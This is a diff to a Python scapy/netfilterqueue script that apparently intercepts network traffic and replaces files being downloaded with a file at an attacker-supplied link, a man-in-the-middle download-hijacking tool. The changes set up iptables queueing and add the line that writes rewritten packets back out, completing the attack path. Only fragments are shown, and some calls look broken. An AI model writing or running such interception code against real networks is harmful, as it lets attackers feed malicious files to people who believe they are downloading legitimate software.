@@ -20,9 +20,6 @@ def get_arguements():
     if not options.replace():
         parser.error("[-] Please specify the download link of the replaced file")
     
-    if options.local_test():
-        local = "true"
-    
     return options
 
 def iptables(local):
@@ -49,13 +46,19 @@ def process_packet(packet):
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
 
     packet.accept()
 
 try:
 
     options = get_arguements()
-    replace_links = options.replace_link
+    replace_link = options.replace_link
+
+    if options.local_test():
+        local = "true"
+    iptables(local)
+
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run() 
